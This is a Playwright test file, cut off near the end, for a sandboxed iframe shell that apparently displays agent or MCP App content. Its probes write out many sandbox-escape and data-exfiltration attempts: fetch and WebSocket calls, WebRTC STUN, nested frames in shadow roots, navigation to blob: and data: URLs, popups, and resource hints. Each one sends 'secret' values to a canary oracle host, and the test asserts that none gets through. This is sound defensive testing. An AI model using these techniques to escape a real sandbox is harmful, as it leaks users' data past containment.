import {
  expect,
  type PlaywrightTestArgs,
  type PlaywrightTestOptions,
  type PlaywrightWorkerArgs,
  type PlaywrightWorkerOptions,
  type Page,
  type TestInfo,
  type TestType,
} from "@playwright/test";
import { presets } from "../presets/presets.ts";
import { resolveTheme } from "../theme/variables.ts";
import type { ConformanceHost, LaunchedDisplay, LeakSuiteOptions } from "./index.ts";
import { attack, inline, js, type Probe, type ProbeContext } from "./kit.ts";
import { BEHAVIOR_PROBES } from "./behavior.ts";
import { CLIPBOARD_PROBES } from "./clipboard.ts";
import { readFileSync } from "node:fs";
import { createRequire } from "node:module";
import {
  httpOracle,
  settle,
  udpOracle,
  type HttpOracle,
  type ServedFile,
  type UdpOracle,
} from "./oracles.ts";

/**
 * The probes, one per channel and variant, numbered by DESIGN.md's egress table. Each attacks from
 * inside the content, as an agent's code would, and asserts with an oracle that nothing left.
 */

/** Whether this engine sends STUN from an unsandboxed page: the WebRTC oracle's positive control. */
async function rtcSendsHere(context: ProbeContext, udp: UdpOracle): Promise<boolean> {
  const tried = await context.page
    .evaluate(async (stun) => {
      const Peer = (window as unknown as { RTCPeerConnection?: typeof RTCPeerConnection })
        .RTCPeerConnection;
      if (typeof Peer !== "function") {
        return false;
      }
      const peer = new Peer({ iceServers: [{ urls: stun }] });
      peer.createDataChannel("control");
      await peer.setLocalDescription(await peer.createOffer());
      await new Promise((resolve) => setTimeout(resolve, 1_500));
      peer.close();
      return true;
    }, udp.stun)
    .catch(() => false);
  const sent = tried && udp.packets() > 0;
  context.measured(
    `${context.engine}: an unsandboxed peer connection ${sent ? "sends" : "sends no"} STUN to the oracle`,
  );
  return sent;
}

/** A child document that says it ran and tries WebRTC (with pre-gathering, which starts at once). */
const childDocument = (stun: string): string =>
  `<script>parent.postMessage({ tag: "child-ran" }, "*"); try { const p = new RTCPeerConnection({ iceServers: [{ urls: ${js(stun)} }], iceCandidatePoolSize: 4 }); p.createDataChannel("x"); p.createOffer().then((o) => p.setLocalDescription(o)); } catch (e) {}</script>`;

/** The verdict of a nested-frame attack: the child never ran, and nothing reached the oracle. */
async function expectNoChild(
  context: ProbeContext,
  display: LaunchedDisplay,
  udp: UdpOracle,
): Promise<Record<string, unknown>> {
  const verdict = await context.result(display, 15_000);
  await settle(1_000);
  expect(verdict.error, "the attack itself failed").toBeUndefined();
  expect(verdict.childRan ?? false, "a nested frame's script ran").toBe(false);
  expect(verdict.frames ?? 0, "a nested frame is still in the tree").toBe(0);
  expect(udp.packets(), "STUN packets reached the oracle").toBe(0);
  if (verdict.reached !== undefined || verdict.blocked !== undefined) {
    context.measured(
      `${context.engine}: a new frame's realm, in the task that added it, was ${verdict.blocked === undefined ? `reachable (RTCPeerConnection: ${JSON.stringify(verdict.reached)})` : `unreachable (${JSON.stringify(verdict.blocked)})`}`,
    );
  }
  return verdict;
}

/** The common head of a nested-frame attack: listen for the child, and make its document. */
const childSetup = (stun: string) => `
    r.childRan = false;
    window.addEventListener("message", (event) => { if (event.data && event.data.tag === "child-ran") r.childRan = true; });
    const child = ${js(childDocument(stun))};
    const makeFrame = () => { const f = document.createElement("iframe"); f.setAttribute("srcdoc", child); return f; };`;

/** A navigated document's beacon to an allowed witness: heard only if that document ran. */
const witnessScript = (origin: string): string =>
  `<script>fetch(${js(`${origin}/ran`)}).catch(() => {});</script>`;

/**
 * A document the frame navigates to must never run: it would be a fresh realm without the shell's
 * defenses. (Starting the display again on the navigation can cut it short, but that is a race,
 * not a wall, so it is not what this asserts.)
 */
function measureWitness(context: ProbeContext, witness: HttpOracle, scheme: string): void {
  const ran = witness.requests().some((request) => request.path === "/ran");
  expect(ran, `a ${scheme} document the frame navigated to ran`).toBe(false);
}

/** Every navigation attempt's verdict: nothing reached the oracle, and the content stayed or restarted. */
async function expectNoNavigation(
  context: ProbeContext,
  display: LaunchedDisplay,
  canary: HttpOracle,
  udp?: UdpOracle,
): Promise<void> {
  await settle(1_500);
  expect(canary.requests(), "the navigation reached the canary").toEqual([]);
  expect(context.requestsTo(canary.origin), "the page requested the canary").toEqual([]);
  if (udp !== undefined) {
    expect(udp.packets(), "a navigated document reached the STUN oracle").toBe(0);
  }
  const events = await display.events();
  const restarts = events.filter((event) => event.type === "navigated").length;
  if (restarts > 0) {
    context.measured(
      `${context.engine}: the navigation replaced the frame's document; the display was started again ${restarts} time(s)`,
    );
    return;
  }
  const frame = await display.frame();
  await expect(
    frame.locator("#marker"),
    "the frame lost its content without being started again",
  ).toHaveCount(1);
  context.measured(`${context.engine}: the frame kept its content`);
}

const navigation = (
  id: string,
  title: string,
  code: (target: string) => string,
  markup = "",
): Probe => ({
  id: `5.${id}`,
  item: 5,
  title: `the frame can't navigate itself out: ${title}`,
  async run(context) {
    const canary = await context.http();
    const target = `${canary.origin}/nav.html?d=secret-${id}`;
    const display = await context.launch({
      config: inline(),
      content: attack(`await wait(150);\n${code(target)}`, markup),
    });
    await expectNoNavigation(context, display, canary);
  },
});

const nested = (id: string, title: string, code: (stun: string) => string, markup = ""): Probe => ({
  id: `4.${id}`,
  item: 4,
  title: `no nested frame runs: ${title}`,
  async run(context) {
    const udp = await context.udp();
    const display = await context.launch({
      config: inline(),
      content: attack(`${childSetup(udp.stun)}\n${code(udp.stun)}\n    await wait(1200);`, markup),
    });
    await expectNoChild(context, display, udp);
  },
});

/**
 * One escape attempt (item 6): no request reaches the canary, no popup opens, no download starts,
 * the top page stays where it was, and the display stays contained (kept, or started again).
 */
const escape = (id: string, title: string, code: string | ((canary: string) => string)): Probe => ({
  id: `6.${id}`,
  item: 6,
  title: `no form, popup, download or top navigation: ${title}`,
  async run(context) {
    const canary = await context.http();
    const c = canary.origin;
    const popups: string[] = [];
    const downloads: string[] = [];
    context.page.on("popup", (popup) => popups.push(popup.url()));
    context.page.context().on("page", (page) => popups.push(page.url()));
    context.page.on("download", (download) => downloads.push(download.url()));
    const display = await context.launch({
      config: inline(),
      content: attack(
        `
    window.addEventListener("click", (event) => event.stopImmediatePropagation(), true);
    await wait(150);
    ${typeof code === "string" ? code : code(c)}`,
        `<form id="form" action="${c}/form" method="get"><input name="d" value="secret"></form>
<form id="blank-form" action="${c}/blank-form" target="_blank"><input name="d" value="secret"></form>
<a id="blank" href="${c}/blank?d=secret" target="_blank">blank</a>
<a id="top" href="${c}/top-link?d=secret" target="_top">top</a>
<a id="remote-download" href="${c}/download.txt" download>download</a>`,
      ),
    });
    const before = context.page.url();
    await expectNoNavigation(context, display, canary);
    expect(popups, "a popup opened").toEqual([]);
    expect(downloads, "a download started").toEqual([]);
    expect(context.page.url(), "the top page navigated").toBe(before);
  },
});

/** A `<link>` hint's attributes. */
interface Hint {
  readonly rel: string;
  readonly href: string;
  readonly as?: string;
}

/**
 * One resource hint (item 8), in three ways: in the content's markup, inserted by its script, and
 * turned on by changing the attributes of a link already in the document. Each is a channel of
 * its own: an engine may process a hint the moment it is connected or changed.
 */
const hint = (id: string, make: (canary: string) => Hint): Probe => ({
  id: `8.${id}`,
  item: 8,
  title: `resource hints open no connection: rel=${id}`,
  async run(context) {
    const control = await context.http();
    const shown = make(control.origin);
    await context.page.evaluate((each) => {
      const link = document.createElement("link");
      link.rel = each.rel;
      link.href = each.href;
      if (each.as !== undefined) {
        link.setAttribute("as", each.as);
      }
      document.head.append(link);
    }, shown);
    await settle(1_200);
    context.measured(
      `${context.engine}: rel=${id} in an unsandboxed page opened ${control.connections()} connection(s), ${control.requests().length} request(s)`,
    );
    const canary = await context.http();
    const target = make(canary.origin);
    const attributes = (each: Hint) =>
      `rel="${each.rel}" href="${each.href}"${each.as === undefined ? "" : ` as="${each.as}"`}`;
    const display = await context.launch({
      config: inline(),
      content: attack(
        `
    const hint = ${js(target)};
    const holder = document.createElement("div");
    holder.innerHTML = '<link ' + ${js(attributes(target))} + '>';
    document.head.append(...holder.childNodes);
    const made = document.createElement("link");
    made.rel = hint.rel;
    made.href = hint.href + (hint.href.includes("?") ? "&" : "?") + "made";
    if (hint.as) made.setAttribute("as", hint.as);
    document.body.append(made);
    const later = document.createElement("link");
    later.rel = "author";
    document.head.append(later);
    if (hint.as) later.setAttribute("as", hint.as);
    later.setAttribute("href", hint.href + (hint.href.includes("?") ? "&" : "?") + "later");
    later.rel = hint.rel;
    await wait(1200);`,
        `<link ${attributes(target)}>`,
      ),
    });
    await context.result(display, 15_000);
    await settle(1_000);
    expect(canary.requests(), "a hint fetched from the canary").toEqual([]);
    expect(canary.connections(), "a hint opened a connection to the canary").toBe(0);
  },
});

/** The official MCP Apps App SDK as one ES module, if it is installed where the suite runs. */
function appSdk(): ServedFile | null {
  try {
    const file = createRequire(import.meta.url).resolve(
      "@modelcontextprotocol/ext-apps/app-with-deps",
    );
    return { type: "text/javascript", data: readFileSync(file) };
  } catch {
    return null;
  }
}

/** Content that connects with the official App SDK, loaded from `sdk`, and reports what it got. */
const connectsWithSdk = (sdk: string): string => `
    const { App, PostMessageTransport } = await import(${js(sdk)});
    const app = new App({ name: "porthole-probe", version: "1" }, {}, { autoResize: false });
    await Promise.race([
      app.connect(new PostMessageTransport(window.parent, window.parent)),
      wait(8000).then(() => { throw new Error("App.connect timed out"); }),
    ]);
    const context = app.getHostContext() || {};
    r.connected = true;
    r.theme = context.theme;
    r.styles = Object.keys((context.styles && context.styles.variables) || {}).length;`;

/**
 * Content written with the official App SDK connects under every preset (OBJECTIVE 3): the host
 * context the host answers passes the SDK's own validation, and the shell beside the content takes
 * none of its answers.
 */
const sdkProbe = (preset: "inline" | "artifact" | "mcp-app"): Probe => ({
  id: `0.app-sdk-${preset}`,
  item: 0,
  title: `content using the official MCP Apps App SDK connects (${preset})`,
  async run(context) {
    const bundle = appSdk();
    if (bundle === null) {
      context.measured(
        "the official App SDK (@modelcontextprotocol/ext-apps) isn't installed: not run",
      );
      return;
    }
    const library = await context.http({ "/ext-apps.js": bundle });
    const sdk = `${library.origin}/ext-apps.js`;
    const egress = { script: [library.origin], connect: [library.origin] };
    const page = `<!doctype html><html><head><title>View</title></head><body>${attack(connectsWithSdk(sdk))}</body></html>`;
    const display =
      preset === "inline"
        ? await context.launch({
            config: inline({ egress }),
            content: attack(connectsWithSdk(sdk)),
          })
        : preset === "artifact"
          ? await context.launch({ config: presets.artifact({ egress }), content: page })
          : await context.launch({
              config: presets.mcpApp({ egress }),
              content: "",
              document: page,
            });
    const verdict = await context.result(display, 20_000);
    expect(verdict.error, "App.connect failed").toBeUndefined();
    expect(verdict).toMatchObject({ connected: true, theme: "light" });
    expect(verdict.styles).toBeGreaterThan(0);
  },
});

export type { Probe, ProbeContext } from "./kit.ts";
export { attack } from "./kit.ts";

export const PROBES: readonly Probe[] = [
  // ── 0: the shell's own wiring, in a real frame ─────────────────────────────────────────────
  {
    id: "0.opaque-origin",
    item: 0,
    title: "the content runs in an opaque origin, never the host's",
    async run(context) {
      const display = await context.launch({
        config: inline(),
        content: attack(`r.origin = window.origin;`),
      });
      expect((await context.result(display)).origin).toBe("null");
    },
  },
  {
    id: "0.globals",
    item: 0,
    title: "the shell defines a global only for each declared capability, fixed in place",
    async run(context) {
      const display = await context.launch({
        config: inline({ capabilities: { sendPrompt: {} } }),
        content: attack(`
    r.sendPrompt = typeof window.sendPrompt;
    r.openLink = typeof window.openLink;
    const original = window.sendPrompt;
    try { window.sendPrompt = () => "replaced"; } catch (e) {}
    r.replaced = window.sendPrompt !== original;`),
      });
      expect(await context.result(display)).toMatchObject({
        sendPrompt: "function",
        openLink: "undefined",
        replaced: false,
      });
    },
  },
  {
    id: "0.theme",
    item: 0,
    title: "the shell applies the declared theme variables and drops any other",
    async run(context) {
      const config = inline();
      const display = await context.launch({
        config,
        scheme: "dark",
        content: attack(`
    await wait(300);
    const style = getComputedStyle(document.documentElement);
    r.accent = style.getPropertyValue("--color-accent").trim();
    r.theme = document.documentElement.getAttribute("data-theme");`),
      });
      expect(await context.result(display)).toMatchObject({
        accent: resolveTheme(config.theme, "dark")["--color-accent"],
        theme: "dark",
      });
    },
  },
  {
    id: "0.streaming",
    item: 0,
    title: "streamed content is drawn inert, and the whole runs once",
    async run(context) {
      const partial = '<div id="a" onclick="document.body.dataset.handler = 1">A</div>';
      const whole = `${partial}<script>document.body.dataset.ran = String((Number(document.body.dataset.ran) || 0) + 1); window.portholeProbe = { done: true };</script>`;
      const display = await context.launch({
        config: inline(),
        partials: [partial, `${partial}<script>document.body.dataset.ran = "draft"`],
        content: whole,
      });
      await context.result(display);
      const frame = await display.frame();
      await expect(frame.locator("body")).toHaveAttribute("data-ran", "1");
      await settle(300);
      await expect(frame.locator("body")).toHaveAttribute("data-ran", "1");
    },
  },

  sdkProbe("inline"),
  sdkProbe("artifact"),
  sdkProbe("mcp-app"),

  // ── 1: fetch-like channels ─────────────────────────────────────────────────────────────────
  {
    id: "1.connect",
    item: 1,
    title: "fetch, XHR, WebSocket, EventSource, beacons and workers reach only allowed origins",
    async run(context) {
      const canary = await context.http();
      const allowed = await context.http();
      const display = await context.launch({
        config: inline({ egress: { connect: [allowed.origin] } }),
        content: attack(`
    const canary = ${js(canary.origin)};
    const attempt = async (name, run) => { try { await run(); r[name] = "sent"; } catch (e) { r[name] = "blocked"; } };
    await attempt("fetch", () => fetch(canary + "/fetch?d=secret"));
    await attempt("xhr", () => new Promise((resolve, reject) => { const x = new XMLHttpRequest(); x.open("GET", canary + "/xhr?d=secret"); x.onload = resolve; x.onerror = reject; x.send(); }));
    await attempt("websocket", () => new Promise((resolve, reject) => { const w = new WebSocket(canary.replace("http", "ws") + "/ws?d=secret"); w.onopen = resolve; w.onerror = reject; setTimeout(reject, 1000); }));
    await attempt("eventsource", () => new Promise((resolve, reject) => { const s = new EventSource(canary + "/sse?d=secret"); s.onopen = resolve; s.onerror = () => { s.close(); reject(); }; setTimeout(reject, 1000); }));
    try { r.beacon = navigator.sendBeacon(canary + "/beacon", "secret"); } catch (e) { r.beacon = "blocked"; }
    if (typeof fetchLater === "function") { try { fetchLater(canary + "/later?d=secret", { activateAfter: 0 }); } catch (e) {} }
    await attempt("worker", () => new Promise((resolve, reject) => {
      const source = "fetch(" + JSON.stringify(canary + "/worker?d=secret") + ").then(() => postMessage('sent'), () => postMessage('blocked'))";
      const worker = new Worker(URL.createObjectURL(new Blob([source], { type: "text/javascript" })));
      worker.onmessage = (event) => (event.data === "sent" ? resolve() : reject());
      worker.onerror = reject;
    }));
    r.allowed = await fetch(${js(allowed.origin)} + "/allowed").then((response) => response.text(), () => "blocked");`),
      });
      const verdict = await context.result(display, 20_000);
      await settle();
      expect(verdict.allowed, "the allowed origin (the positive control)").toBe("oracle");
      expect(allowed.requests().map((request) => request.path)).toContain("/allowed");
      expect(canary.requests(), "requests reached the canary").toEqual([]);
      expect(context.requestsTo(canary.origin)).toEqual([]);
      expect(verdict).toMatchObject({
        fetch: "blocked",
        xhr: "blocked",
        websocket: "blocked",
        eventsource: "blocked",
        worker: "blocked",
      });
    },
  },

  // ── 2: resources ───────────────────────────────────────────────────────────────────────────
  {
    id: "2.resources",
    item: 2,
    title: "images, media, fonts, styles, scripts and manifests load only from allowed origins",
    async run(context) {
      const canary = await context.http();
      const allowed = await context.http();
      const c = canary.origin;
      const markup = `
<img src="${c}/img.png?d=secret">
<div style="background-image: url(${c}/bg.png); width: 4px; height: 4px"></div>
<svg width="8" height="8"><image href="${c}/svg.png" width="4" height="4"/><use href="${c}/sprite.svg#a"/></svg>
<video poster="${c}/poster.png" src="${c}/video.mp4"></video>
<audio src="${c}/audio.mp3" preload="auto"></audio>
<input type="image" src="${c}/input.png" alt="">
<link rel="stylesheet" href="${c}/style.css">
<link rel="manifest" href="${c}/manifest.json">
<link rel="icon" href="${c}/icon.png">
<style>@import url("${c}/import.css"); @font-face { font-family: Leak; src: url("${c}/font.woff2"); } .leak { font-family: Leak; }</style>
<span class="leak">font</span>
<script src="${c}/script.js"></script>
<img id="ok" src="${allowed.origin}/ok.png">`;
      const display = await context.launch({
        config: inline({ egress: { img: [allowed.origin] } }),
        content: attack(
          `
    await import(${js(`${c}/module.js`)}).catch(() => {});
    try { new Worker(${js(`${c}/worker.js`)}); } catch (e) {}
    const ok = document.getElementById("ok");
    r.allowed = await new Promise((resolve) => { if (ok.complete && ok.naturalWidth > 0) resolve("loaded"); ok.onload = () => resolve("loaded"); ok.onerror = () => resolve("blocked"); setTimeout(() => resolve("timeout"), 3000); });
    r.script = typeof globalThis.__portholeOracleScript;`,
          markup,
        ),
      });
      const verdict = await context.result(display, 20_000);
      await settle();
      expect(verdict.allowed, "the allowed image (the positive control)").toBe("loaded");
      expect(canary.requests(), "resources loaded from the canary").toEqual([]);
      expect(context.requestsTo(canary.origin)).toEqual([]);
      expect(verdict.script).toBe("undefined");
    },
  },

  // ── 3: WebRTC ──────────────────────────────────────────────────────────────────────────────
  {
    id: "3.webrtc",
    item: 3,
    title: "WebRTC is gone before content runs, and can't be brought back",
    async run(context) {
      const control = await context.udp();
      const sends = await rtcSendsHere(context, control);
      const udp = await context.udp();
      const display = await context.launch({
        config: inline(),
        content: attack(`
    r.names = Object.getOwnPropertyNames(window).filter((name) => /^(RTC|webkitRTC)/.test(name) && window[name] !== undefined);
    r.peer = typeof RTCPeerConnection;
    r.prefixed = typeof webkitRTCPeerConnection;
    try { window.RTCPeerConnection = function () {}; } catch (e) {}
    try { delete window.RTCPeerConnection; } catch (e) {}
    try { Object.defineProperty(window, "RTCPeerConnection", { value: function () {} }); } catch (e) {}
    r.restored = typeof window.RTCPeerConnection;
    const Peer = window.RTCPeerConnection || window.webkitRTCPeerConnection || globalThis.RTCPeerConnection || self.RTCPeerConnection;
    if (typeof Peer === "function") {
      try { const p = new Peer({ iceServers: [{ urls: ${js(udp.stun)} }], iceCandidatePoolSize: 4 }); p.createDataChannel("x"); await p.setLocalDescription(await p.createOffer()); r.connected = true; } catch (e) { r.connected = false; }
    }
    await wait(1500);`),
      });
      const verdict = await context.result(display, 15_000);
      await settle();
      expect(verdict).toMatchObject({
        names: [],
        peer: "undefined",
        prefixed: "undefined",
        restored: "undefined",
      });
      expect(verdict.connected).toBeUndefined();
      expect(udp.packets(), "STUN reached the oracle").toBe(0);
      if (!sends) {
        context.measured(
          `${context.engine}: the STUN oracle has no positive control here; the constructors' absence is the evidence`,
        );
      }
    },
  },

  // ── 4: nested frames ───────────────────────────────────────────────────────────────────────
  nested(
    "light-dom",
    "a srcdoc frame appended to the document",
    () => `
    document.body.append(makeFrame());
    await wait(50);
    r.frames = document.querySelectorAll("iframe").length;`,
  ),
  nested(
    "sync-realm",
    "reaching a new frame's realm in the same task it was added",
    (stun) => `
    const f = document.createElement("iframe");
    document.body.append(f);
    try {
      const w = window[window.length - 1] || f.contentWindow;
      r.reached = typeof (w && w.RTCPeerConnection);
      const p = new w.RTCPeerConnection({ iceServers: [{ urls: ${js(stun)} }], iceCandidatePoolSize: 4 });
      p.createDataChannel("x");
      p.createOffer().then((o) => p.setLocalDescription(o));
      r.childRan = true;
    } catch (e) { r.blocked = String(e && e.name); }
    await wait(50);
    r.frames = document.querySelectorAll("iframe").length;`,
  ),
  nested(
    "open-shadow",
    "a frame inside an open shadow root",
    () => `
    const host = document.createElement("div");
    document.body.append(host);
    const root = host.attachShadow({ mode: "open" });
    root.append(makeFrame());
    await wait(50);
    r.frames = root.querySelectorAll("iframe").length;`,
  ),
  nested(
    "closed-shadow",
    "a frame inside a closed shadow root",
    () => `
    const host = document.createElement("div");
    document.body.append(host);
    const root = host.attachShadow({ mode: "closed" });
    root.innerHTML = '<p>shadow</p>';
    root.append(makeFrame());
    await wait(50);
    r.frames = root.querySelectorAll("iframe").length;`,
  ),
  nested(
    "shadow-nested",
    "a frame two shadow roots deep",
    () => `
    const outer = document.createElement("div");
    document.body.append(outer);
    const first = outer.attachShadow({ mode: "closed" });
    const inner = document.createElement("div");
    first.append(inner);
    const second = inner.attachShadow({ mode: "open" });
    second.append(makeFrame());
    await wait(50);
    r.frames = second.querySelectorAll("iframe").length;`,
  ),
  nested(
    "declarative-shadow",
    "a frame in a declarative closed shadow root (setHTMLUnsafe)",
    () => `
    const host = document.createElement("div");
    document.body.append(host);
    if (typeof host.setHTMLUnsafe === "function") {
      host.setHTMLUnsafe('<div id="h"><template shadowrootmode="closed"><iframe srcdoc="' + child.replace(/"/g, "&quot;") + '"></iframe></template></div>');
    }
    await wait(50);
    r.frames = document.querySelectorAll("iframe").length;
    r.template = document.querySelectorAll("template").length;`,
  ),
  nested(
    "parse-html-unsafe",
    "a frame in a declarative shadow root parsed by Document.parseHTMLUnsafe",
    () => `
    if (typeof Document.parseHTMLUnsafe === "function") {
      const parsed = Document.parseHTMLUnsafe('<div id="h"><template shadowrootmode="closed"><iframe srcdoc="' + child.replace(/"/g, "&quot;") + '"></iframe></template></div>');
      document.body.append(document.adoptNode(parsed.getElementById("h")));
    }
    await wait(50);
    r.frames = document.querySelectorAll("iframe").length;`,
  ),
  nested(
    "domparser",
    "a frame in a declarative shadow root from DOMParser",
    () => `
    const parsed = new DOMParser().parseFromString('<div id="h"><template shadowrootmode="closed"><iframe srcdoc="' + child.replace(/"/g, "&quot;") + '"></iframe></template></div>', "text/html");
    document.body.append(document.importNode(parsed.getElementById("h"), true));
    await wait(50);
    r.frames = document.querySelectorAll("iframe").length;`,
  ),
  nested(
    "document-write",
    "a frame written in after the content rewrites the document",
    () => `
    try {
      document.open();
      document.write('<div><template shadowrootmode="closed"><iframe srcdoc="' + child.replace(/"/g, "&quot;") + '"></iframe></template></div><iframe srcdoc="' + child.replace(/"/g, "&quot;") + '"></iframe>');
      document.close();
      r.rewrote = true;
    } catch (e) { r.rewrite = "refused"; }
    await wait(50);
    r.frames = document.querySelectorAll("iframe").length;`,
  ),
  nested(
    "plugins",
    "object and embed elements holding a document",
    () => `
    const object = document.createElement("object");
    object.type = "text/html";
    object.data = "data:text/html," + encodeURIComponent(child);
    const embed = document.createElement("embed");
    embed.type = "text/html";
    embed.src = "data:text/html," + encodeURIComponent(child);
    document.body.append(object, embed);
    await wait(50);
    r.frames = document.querySelectorAll("object, embed").length;`,
  ),
  nested(
    "foreign-object",
    "a frame inside SVG foreignObject",
    () => `
    const holder = document.createElement("div");
    holder.innerHTML = '<svg width="10" height="10"><foreignObject width="10" height="10"><iframe srcdoc="' + child.replace(/"/g, "&quot;") + '"></iframe></foreignObject></svg>';
    document.body.append(holder);
    await wait(50);
    r.frames = document.querySelectorAll("iframe").length;`,
  ),
  nested(
    "template-clone",
    "a frame cloned out of a template",
    () => `
    const template = document.createElement("template");
    template.innerHTML = '<section><iframe srcdoc="' + child.replace(/"/g, "&quot;") + '"></iframe></section>';
    document.body.append(template.content.cloneNode(true));
    await wait(50);
    r.frames = document.querySelectorAll("iframe").length;`,
  ),
  {
    id: "4.static",
    item: 4,
    title: "no nested frame runs: frames in the content's own markup",
    async run(context) {
      const udp = await context.udp();
      const child = childDocument(udp.stun).replace(/"/gu, "&quot;");
      const display = await context.launch({
        config: inline(),
        content: attack(
          `${childSetup(udp.stun)}\n    await wait(1200);\n    r.frames = document.querySelectorAll("iframe, object, embed").length;`,
          `<iframe srcdoc="${child}"></iframe><div><template shadowrootmode="closed"><iframe srcdoc="${child}"></iframe></template></div>`,
        ),
      });
      await expectNoChild(context, display, udp);
    },
  },

  // ── 5: self-navigation ─────────────────────────────────────────────────────────────────────
  navigation("location", "location.href", (target) => `location.href = ${js(target)};`),
  navigation("replace", "location.replace", (target) => `location.replace(${js(target)});`),
  navigation(
    "open-self",
    "window.open(url, '_self')",
    (target) => `window.open(${js(target)}, "_self");`,
  ),
  navigation(
    "refresh",
    "a meta refresh",
    (target) => `
    const meta = document.createElement("meta");
    meta.httpEquiv = "refresh";
    meta.content = "0;url=" + ${js(target)};
    document.head.append(meta);`,
  ),
  navigation(
    "anchor",
    "a link clicked past the shell's own handler",
    (target) => `
    window.addEventListener("click", (event) => event.stopImmediatePropagation(), true);
    const a = document.createElement("a");
    a.href = ${js(target)};
    a.target = "_self";
    a.textContent = "go";
    document.body.append(a);
    a.click();`,
  ),
  navigation(
    "svg-link",
    "an SVG xlink:href link clicked",
    (target) => `
    window.addEventListener("click", (event) => event.stopImmediatePropagation(), true);
    const holder = document.createElement("div");
    holder.innerHTML = '<svg width="40" height="40"><a id="svg-link"><rect width="40" height="40"/></a></svg>';
    document.body.append(holder);
    const link = holder.querySelector("#svg-link");
    link.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", ${js(target)});
    link.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, view: window }));`,
  ),
  {
    id: "5.host-origin",
    item: 5,
    title: "the frame can't navigate itself out: to the embedding page's own origin",
    async run(context) {
      const canary = await context.http();
      // A srcdoc document's base URL is its parent's: a path goes to the host's own origin.
      const display = await context.launch({
        config: inline(),
        content: attack(`
    await wait(150);
    location.href = "/__probe/nav.html?d=secret";`),
      });
      await expectNoNavigation(context, display, canary);
      expect(
        context
          .requestsTo(new URL(context.page.url()).origin)
          .filter((url) => url.includes("/__probe/")),
        "the frame navigated to the host's own origin",
      ).toEqual([]);
    },
  },
  {
    id: "5.blob",
    item: 5,
    title: "the frame can't navigate itself out: to a blob: document of its own (a fresh realm)",
    async run(context) {
      const canary = await context.http();
      const udp = await context.udp();
      const witness = await context.http();
      const page = `<p id="blob">blob</p>${childDocument(udp.stun)}${witnessScript(witness.origin)}`;
      const display = await context.launch({
        config: inline({ egress: { connect: [witness.origin] } }),
        content: attack(`
    await wait(150);
    location.href = URL.createObjectURL(new Blob([${js(page)}], { type: "text/html" }));`),
      });
      await expectNoNavigation(context, display, canary, udp);
      measureWitness(context, witness, "blob:");
    },
  },
  {
    id: "5.data",
    item: 5,
    title: "the frame can't navigate itself out: to a data: document",
    async run(context) {
      const canary = await context.http();
      const udp = await context.udp();
      const witness = await context.http();
      const page = `<p id="data">data</p>${childDocument(udp.stun)}${witnessScript(witness.origin)}`;
      const display = await context.launch({
        config: inline({ egress: { connect: [witness.origin] } }),
        content: attack(`
    await wait(150);
    location.href = "data:text/html," + encodeURIComponent(${js(page)});`),
      });
      await expectNoNavigation(context, display, canary, udp);
      measureWitness(context, witness, "data:");
    },
  },

  // ── 6: forms, popups, downloads, top navigation ────────────────────────────────────────────
  escape("submit", "a form submitted", `document.getElementById("form").submit();`),
  escape(
    "request-submit",
    "a form submitted with requestSubmit",
    `document.getElementById("form").requestSubmit();`,
  ),
  escape(
    "blank-form",
    "a form submitted to a new window",
    `document.getElementById("blank-form").submit();`,
  ),
  escape(
    "open",
    "window.open",
    (c) => `r.opened = window.open(${js(`${c}/popup?d=secret`)}) !== null;`,
  ),
  escape(
    "blank-link",
    "a target=_blank link clicked past the shell",
    `document.getElementById("blank").click();`,
  ),
  escape(
    "download",
    "a blob download clicked",
    `const a = document.createElement("a"); a.href = URL.createObjectURL(new Blob(["secret"])); a.download = "secret.txt"; document.body.append(a); a.click();`,
  ),
  escape(
    "remote-download",
    "a remote download clicked",
    `document.getElementById("remote-download").click();`,
  ),
  escape("top", "top.location assigned", (c) => `top.location = ${js(`${c}/top?d=secret`)};`),
  escape(
    "top-link",
    "a target=_top link clicked past the shell",
    `document.getElementById("top").click();`,
  ),
  escape(
    "parent",
    "parent.location assigned",
    (c) => `parent.location.href = ${js(`${c}/parent?d=secret`)};`,
  ),

  // ── 7: base, plugins ───────────────────────────────────────────────────────────────────────
  {
    id: "7.base-plugins",
    item: 7,
    title: "a <base> changes nothing and plugins load nothing",
    async run(context) {
      const canary = await context.http();
      const c = canary.origin;
      const display = await context.launch({
        config: inline(),
        content: attack(
          `
    const before = document.baseURI;
    const base = document.createElement("base");
    base.href = ${js(`${c}/`)};
    document.head.append(base);
    r.baseChanged = document.baseURI !== before;
    const img = document.createElement("img");
    img.src = "relative.png?d=secret";
    document.body.append(img);
    const object = document.createElement("object");
    object.data = ${js(`${c}/object.html`)};
    const embed = document.createElement("embed");
    embed.src = ${js(`${c}/embed.html`)};
    document.body.append(object, embed);
    await wait(500);
    r.plugins = document.querySelectorAll("object, embed").length;`,
          `<object data="${c}/static-object.html"></object><embed src="${c}/static-embed.swf">`,
        ),
      });
      const verdict = await context.result(display);
      await settle();
      expect(verdict).toMatchObject({ baseChanged: false, plugins: 0 });
      expect(canary.requests()).toEqual([]);
      expect(context.requestsTo(canary.origin)).toEqual([]);
    },
  },

  // ── 8: resource hints ──────────────────────────────────────────────────────────────────────
  hint("preconnect", (c) => ({ rel: "preconnect", href: c })),
  hint("dns-prefetch", (c) => ({ rel: "dns-prefetch", href: c })),
  hint("prefetch", (c) => ({ rel: "prefetch", href: `${c}/prefetch.html` })),
  hint("prerender", (c) => ({ rel: "prerender", href: `${c}/prerender.html` })),
  hint("preload", (c) => ({ rel: "preload", href: `${c}/preload.png`, as: "image" })),
  hint("modulepreload", (c) => ({ rel: "modulepreload", href: `${c}/modulepreload.js` })),
  {
    id: "8.speculation-rules",
    item: 8,
    title: "resource hints open no connection: speculation rules",
    async run(context) {
      const canary = await context.http();
      const c = canary.origin;
      const rules = (name: string) =>
        JSON.stringify({
          prefetch: [{ source: "list", urls: [`${c}/prefetch-${name}.html`] }],
          prerender: [{ source: "list", urls: [`${c}/prerender-${name}.html`] }],
        });
      const display = await context.launch({
        config: inline(),
        content: attack(
          `
    const rules = document.createElement("script");
    rules.type = "speculationrules";
    rules.textContent = ${js(rules("dynamic"))};
    document.head.append(rules);
    await wait(1200);`,
          `<script type="speculationrules">${rules("static")}</script>`,
        ),
      });
      await context.result(display, 15_000);
      await settle(1_000);
      expect(canary.requests()).toEqual([]);
      expect(canary.connections()).toBe(0);
    },
  },

  // ── 9: the host ────────────────────────────────────────────────────────────────────────────
  {
    id: "9.host",
    item: 9,
    title: "the content can't reach the host's document, storage, cookies or credentials",
